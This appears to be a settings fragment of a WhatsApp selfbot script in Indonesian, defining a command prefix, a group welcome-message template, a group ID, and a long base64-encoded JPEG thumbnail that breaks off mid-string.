					prefix = '#'
txtwl = `*Hai* *@${num.split('@')[0]}*\n*╔❏* *Welcome in group:*\n*╠❏* *${mdata.subject}*\n*╠❏*\n*╠❏* *Intro dulu*\n*╠❏* *Nama:* \n*╠❏* *Umur:* \n*╠❏* *Asal kota:* \n*╠❏* *Kelas:* \n*╠❏* *Jenis kelamin:* \n*╚❏* *Nomor:* ${num.replace('@s.whatsapp.net', '')}\n*Semoga Betah yaa~~*\n${mdata.desc}`
fake = '*SELFBOT*'
numbernye = '0@s.whatsapp.net'
banChats = true
setgrup = "6289636006352-1606097314@g.us"
setthumb = `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uisFUPPPPPPPPPPPPC0KF/AuZwGcKgAAJfg1U+PPPPPPPPPPPPPwq14hdBQFgwQWjUfQ11gvPPPPPPPPPPPPgq1wFI7ZjTgGgYwPQ11lfPPPPPPPPPPPPQq1wUIuLLOm/wA8Eb4NdZTzzzzzzzzzzzy16JewEK5lEE8kIMf4NtsHzzzzzzzzzzzwzqmbX7zn333323375InEXzzzzzzzzzzzzzl5XaG4X77777777rUqHzzzzzzzzzzzzzzyjD7z73777777763rzzzzzzzzzzzzzzzzzznDz77777777bkBzzzzzzzzzzzzzzzzzzzz8txrHnXHN0iLDzzzzzzzzzzzzzzzzzzzzzw2j+157k/zzzzzzzzzzzzzzzzzzzzzzzzwiS2fJ2wcHzzzzzzzzzzzzzzzzzzzzy53EX7/AOs//pyxG0888888888888888888wZDDDDDDDDDDD1d888888888888888888lCAAAAAAAAAAARy888888888888888888JDDDDCbmlDDDDH1888888888888888888HLDDDSJcSDDDDW1888888888888888888yoDDDTdlTDDDDAC888888888888888888LMPPPP+OuPPPPb5888888888888888888CU/wDvvvvvvvvvsa/PPPPPPPPPPPPPPPPPLH/uuttsuuttr1vPPPPPPPPPPPPPPPPPPHls8888888888xx/PPPPPPPPPPPPPPPPPPIQAAAAAAAAAAA/PPPPPPPPPP/xAAtEQABAgQEBgMAAgMBAAAAAAACAAMBBBESEBQyUiAhMDEzQBMiQiNBNFBicf/aAAgBAgEBPwD/AFLbZOOUgoAyGoE6wJjcHBXjYZv5xVjMewJ9mz7w0+lKeZG2USUEfMiwBsi/ChKuEss5dRZT/tRkzRMOj+FHl3wlvDRA3QlM+H0oRISrBMv3p5/8ioNOH2TEt9rzX1h2VOEgA9QJ6WIdCbcJol8g/H8icdI/Tk9RoJcbzMl9R5Qwi8IqMyUey+cl8xIX6d0MwJK7B1kXOaKFJT1JVsh+0cDMQ7o3iPSq8QGUEDwn3wchVsxRQjDv6TDd5YGYgNYojI+/REkw5XkeEy1cN4+kyFjeDzlS6YlamzvGuDwWOU9BlgiLng+do8FCVCVCVCVCVCVCxYOhUwmWSPmKiJD360syJfaO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